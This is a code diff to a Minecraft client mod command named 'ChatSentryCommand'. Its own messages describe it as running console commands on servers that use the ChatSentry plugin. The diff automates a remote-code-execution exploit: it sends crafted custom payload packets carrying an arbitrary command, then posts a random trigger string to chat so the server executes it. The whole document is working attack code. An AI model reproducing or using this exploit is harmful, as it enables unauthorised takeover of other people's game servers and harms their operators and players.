@@ -10,6 +10,8 @@ import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
 import net.minecraft.client.MinecraftClient;
 import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
 
+import java.util.Random;
+
 public class ChatSentryCommand extends Command {
     public ChatSentryCommand(MinecraftClient minecraftClient) {
         super("chatsentry", "Executes bungee command through console!", minecraftClient);
@@ -26,7 +28,7 @@ public class ChatSentryCommand extends Command {
                         .then(ClientCommandManager.argument("command", StringArgumentType.greedyString())
                                 .executes(context -> {
                                     Helper.sendPacket(new CustomPayloadC2SPacket(
-                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), true, "")
+                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), true, "", "")
                                     ));
                                     Helper.printChatMessage("Chat sentry bungee payload packet sent!");
                                     return SINGLE_SUCCESS;
@@ -39,17 +41,30 @@ public class ChatSentryCommand extends Command {
                         })
                         .then(ClientCommandManager.argument("command", StringArgumentType.greedyString())
                                 .executes(context -> {
-                                    Helper.sendPacket(new CustomPayloadC2SPacket(
-                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), false, "config")
-                                    ));
-
-                                    Helper.sendPacket(new CustomPayloadC2SPacket(
-                                            new ChatSentryPayloadPacket(context.getArgument("command", String.class), false, "module")
-                                    ));
-                                    Helper.printChatMessage("Chat sentry backend payload packet sent! Type SpigotRCEOnTop to execute console command!");
+                                    String command = context.getArgument("command", String.class);
+                                    new Thread(() -> sendAutoExecution(command)).start();
                                     return SINGLE_SUCCESS;
                                 })
-                        ));
+                        )
+                );
 
+    }
+
+    private void sendAutoExecution(String command) {
+        String s = Helper.generateRandomString(4, "igasdgugadwab", new Random());
+        Helper.sendPacket(new CustomPayloadC2SPacket(
+                new ChatSentryPayloadPacket(command, false, "config", s)
+        ));
+
+        Helper.sendPacket(new CustomPayloadC2SPacket(
+                new ChatSentryPayloadPacket(command, false, "module", s)
+        ));
+        Helper.printChatMessage("Chat sentry backend payload packet sent! Sending execution message!");
+        try {
+            Thread.sleep(100);
+        } catch (InterruptedException e) {
+            Helper.printChatMessage("Unable to sleep for message, send in chat: " + s);
+        }
+        getMinecraftClient().getNetworkHandler().sendChatMessage(s);
     }
 }
